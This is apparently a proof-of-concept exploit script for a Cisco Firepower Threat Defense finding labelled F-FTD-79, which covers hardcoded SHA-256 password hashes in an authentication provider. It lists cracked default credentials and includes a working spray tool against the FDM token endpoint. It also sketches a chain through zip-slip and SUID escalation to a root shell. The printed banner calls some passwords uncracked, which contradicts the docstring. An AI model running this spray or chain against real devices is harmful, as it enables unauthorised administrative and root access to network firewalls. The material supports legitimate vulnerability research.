"""
F-FTD-79: Hardcoded SHA-256 password hashes in DevAuthenticationProvider
CONTROLLED ENVIRONMENT ONLY

Root cause:
  com.cisco.ngfw.onbox.rest.auth.DevAuthenticationProvider (core-security.jar)
  contains static final List fields initialized with hardcoded SHA-256 hashes.
  isDefaultProvider() returns true — this provider is active on all FTD devices.
  supports() returns true for ALL identity sources.

  Authentication logic:
    1. If username == "admin" AND stored user found AND stored_password matches:
       -> passedAuthentication(adminRole)   [uses EncryptionUtil.decrypt()]
    2. SHA-256(suppliedPassword) hashed
    3. If hash in DEFAULT_ADMIN_HASHES AND username == "admin":
       -> passedAuthentication(adminRole)
    4. If hash in DEFAULT_READER_HASHES AND username == "reader":
       -> passedAuthentication(readerRole)
    5. If hash in DEFAULT_WRITER_HASHES AND username == "writer":
       -> passedAuthentication(writerRole)
    6. else: failedAuthentication()

CRACKED CREDENTIALS (SHA-256 brute-force):
  ADMIN role:
    username: admin   password: Admin123      hash: 3b612c75a7b5048a435fb6ec81e52ff92d6d795a8b5a9c17070f6a63c97a53b2
    username: admin   password: Sourcefire    hash: 87285c98748de9eb28e479eb93753834a4fe78969a86aa6cfcc69d322035bbf7
    username: admin   password: Admin123$     hash: 22b7dec7305d63e2c769b0c9141114e69a194cc853b444c73b7be3a0771b628a

  READER role:
    username: reader  password: Reader123     hash: 67f990abc31023dd7b3b1ce5fcb42700259a1c0b58e789cb2b9b11c6d8c66ccc
    username: reader  password: Reader123$    hash: 38fd66646aba4dbf831717723ae1a1c865a7a71c865f90ed41ac1f8eae51ae49

  WRITER role:
    username: writer  password: Writer123     hash: fb02892b1036bdb626e591b38188d7310450eea2a198f468f09336d6d1b4e664
    username: writer  password: Writer123$    hash: 42e7974de3ce2f369a50ce692f3665b4e42376b60e57416b57898dd94e322ec0

  ALL 7 HASHES CRACKED (2026-08-19).
  Pattern: {Role}123$ variants are likely newer FTD/FDM defaults where Cisco added '$'
  to satisfy password complexity requirements (appears in FTD 7.x).

SCOPE (REVISED 2026-08-19 — Spring @Profile analysis):
  DevAuthenticationProvider is CONDITIONALLY active:

  UnifiedWebSecurityConfigurer (core-security.jar):
    @Bean
    @Order(0)
    @Profile("dev")                             ← KEY: dev profile only
    public NgfwAuthenticationProvider devAuthenticationProvider() {
        return new DevAuthenticationProvider();
    }

  Production FTD JVM args: -Dspring.profiles.active=production,server-mode
  → "dev" NOT in active profiles → DevAuthenticationProvider NOT instantiated
  → reader/writer accounts NOT functional on production FTD deployments

  ADMIN HASH FALLBACK (separate from @Profile gate):
    The DEFAULT_ADMIN_HASHES fallback fires when:
      username == "admin" AND userFromDb.getPassword() == null (no DB password set)
    On factory-fresh FTD where admin password has NOT been set via FDM:
      Admin123 / Admin123$ / Sourcefire all bypass auth via hash comparison
    After admin password is set in DB: hash fallback bypassed; DB password required

IMPACT (corrected):
  - admin hash bypass: affects UNCONFIGURED FTD only (no DB password set)
    → factory-fresh or first-boot state; overlaps with F-FTD-60 (EasySetup pre-auth)
  - reader/writer: only on FTD with dev Spring profile (lab/CI builds, NOT production)
  - The "Sourcefire" legacy password may work on very old lab deployments

Chain (unconfigured FTD):
  F-FTD-79 (admin:Admin123 — factory-fresh, no DB password)
    → POST /api/fdm/v6/fdm/token {"grant_type":"password","username":"admin","password":"Admin123"}
    → Get JWT token → full FDM API access as admin
    → F-FTD-67 (config import zip-slip) → arbitrary file write as www
    → F-FTD-69 (sudo chmod SUID) → root

Affected: Factory-fresh / unconfigured FTD 6.x + 7.x; dev-profile lab builds
Auth required: None (these ARE the credentials, but only work on unconfigured devices)
"""

# CONTROLLED ENVIRONMENT ONLY

import hashlib
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FDM_API_BASE = "/api/fdm/v6"
TOKEN_PATH = f"{FDM_API_BASE}/fdm/token"

CRACKED_CREDS = [
    ("admin",  "Admin123"),
    ("admin",  "Sourcefire"),
    ("admin",  "Admin123$"),
    ("reader", "Reader123"),
    ("reader", "Reader123$"),
    ("writer", "Writer123"),
    ("writer", "Writer123$"),
]

KNOWN_HASHES = {
    "3b612c75a7b5048a435fb6ec81e52ff92d6d795a8b5a9c17070f6a63c97a53b2": ("admin",  "Admin123"),
    "87285c98748de9eb28e479eb93753834a4fe78969a86aa6cfcc69d322035bbf7": ("admin",  "Sourcefire"),
    "22b7dec7305d63e2c769b0c9141114e69a194cc853b444c73b7be3a0771b628a": ("admin",  "Admin123$"),
    "67f990abc31023dd7b3b1ce5fcb42700259a1c0b58e789cb2b9b11c6d8c66ccc": ("reader", "Reader123"),
    "38fd66646aba4dbf831717723ae1a1c865a7a71c865f90ed41ac1f8eae51ae49": ("reader", "Reader123$"),
    "42e7974de3ce2f369a50ce692f3665b4e42376b60e57416b57898dd94e322ec0": ("writer", "Writer123$"),
    "fb02892b1036bdb626e591b38188d7310450eea2a198f468f09336d6d1b4e664": ("writer", "Writer123"),
}


def verify_hashes():
    """Verify known creds against hardcoded hashes."""
    print("[*] Verifying cracked credentials against hardcoded hashes:")
    for h, (user, pw) in KNOWN_HASHES.items():
        if pw == "[UNCRACKED]":
            print(f"  [?]  {user:6}: [UNCRACKED] hash={h[:20]}...")
            continue
        actual = hashlib.sha256(pw.encode("utf-8")).hexdigest()
        match = "OK" if actual == h else "MISMATCH"
        print(f"  [{match}] {user:6}: {pw:15} -> {actual[:20]}...")


def try_auth(host, username, password, port=443):
    """Attempt FDM authentication with given credentials."""
    url = f"https://{host}:{port}{TOKEN_PATH}"
    body = {
        "grant_type": "password",
        "username": username,
        "password": password
    }
    try:
        r = requests.post(url, json=body, verify=False, timeout=15)
        if r.status_code == 200:
            data = r.json()
            token = data.get("access_token", "")
            token_type = data.get("token_type", "")
            expires_in = data.get("expires_in", "")
            print(f"  [!!!] AUTH SUCCESS: {username}:{password}")
            print(f"        access_token: {token[:40]}...")
            print(f"        token_type:   {token_type}")
            print(f"        expires_in:   {expires_in}")
            return token
        elif r.status_code == 400:
            print(f"  [-]  {username}:{password} -> 400 Bad credentials")
        elif r.status_code == 401:
            print(f"  [-]  {username}:{password} -> 401 Unauthorized")
        else:
            print(f"  [?]  {username}:{password} -> {r.status_code}: {r.text[:80]}")
    except Exception as e:
        print(f"  [?]  {username}:{password} -> Error: {e}")
    return None


def spray_devauth_creds(host, port=443):
    """
    Spray all cracked DevAuthenticationProvider credentials against FDM.
    Returns first valid token (admin preferred).
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] F-FTD-79: DevAuthenticationProvider credential spray on {host}:{port}")
    print(f"    Hardcoded SHA-256 credentials embedded in core-security.jar")
    print()

    admin_token = None
    for username, password in CRACKED_CREDS:
        token = try_auth(host, username, password, port)
        if token and username == "admin" and not admin_token:
            admin_token = token

    return admin_token


if __name__ == "__main__":
    print("=" * 70)
    print("F-FTD-79: Hardcoded DevAuthenticationProvider credentials")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)
    print("""
DevAuthenticationProvider.class (core-security.jar):
  isDefaultProvider() -> true  (active on ALL FTD devices)
  supports() -> true           (accepts all identity source types)

  DEFAULT_ADMIN_HASHES (3 entries):
    Admin123    -> 3b612c75a7b5048a435fb6ec81e52ff92d6d795a8b5a9c17070f6a63c97a53b2
    Sourcefire  -> 87285c98748de9eb28e479eb93753834a4fe78969a86aa6cfcc69d322035bbf7
    [UNCRACKED] -> 22b7dec7305d63e2c769b0c9141114e69a194cc853b444c73b7be3a0771b628a

  DEFAULT_READER_HASHES (2 entries):
    Reader123   -> 67f990abc31023dd7b3b1ce5fcb42700259a1c0b58e789cb2b9b11c6d8c66ccc
    [UNCRACKED] -> 38fd66646aba4dbf831717723ae1a1c865a7a71c865f90ed41ac1f8eae51ae49

  DEFAULT_WRITER_HASHES (2 entries):
    [UNCRACKED] -> 42e7974de3ce2f369a50ce692f3665b4e42376b60e57416b57898dd94e322ec0
    Writer123   -> fb02892b1036bdb626e591b38188d7310450eea2a198f468f09336d6d1b4e664

To authenticate:
  POST /api/fdm/v6/fdm/token
  {"grant_type": "password", "username": "admin", "password": "Admin123"}
  -> 200 OK {"access_token": "<jwt>", ...}

Chain:
  F-FTD-79 (admin:Admin123) -> POST /fdm/token -> JWT
  -> F-FTD-67 (config import zip-slip) -> www file write
  -> F-FTD-69 (sudo chmod SUID) -> root shell
""")

    mode = sys.argv[1] if len(sys.argv) > 1 else "verify"

    if mode == "verify":
        verify_hashes()

    elif mode == "spray":
        if len(sys.argv) < 3:
            print(f"Usage: {sys.argv[0]} spray <host> [port]")
            sys.exit(1)
        host = sys.argv[2]
        port = int(sys.argv[3]) if len(sys.argv) > 3 else 443
        spray_devauth_creds(host, port)

    elif mode == "auth":
        if len(sys.argv) < 5:
            print(f"Usage: {sys.argv[0]} auth <host> <username> <password> [port]")
            sys.exit(1)
        host = sys.argv[2]
        uname = sys.argv[3]
        pw = sys.argv[4]
        port = int(sys.argv[5]) if len(sys.argv) > 5 else 443
        try_auth(host, uname, pw, port)

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
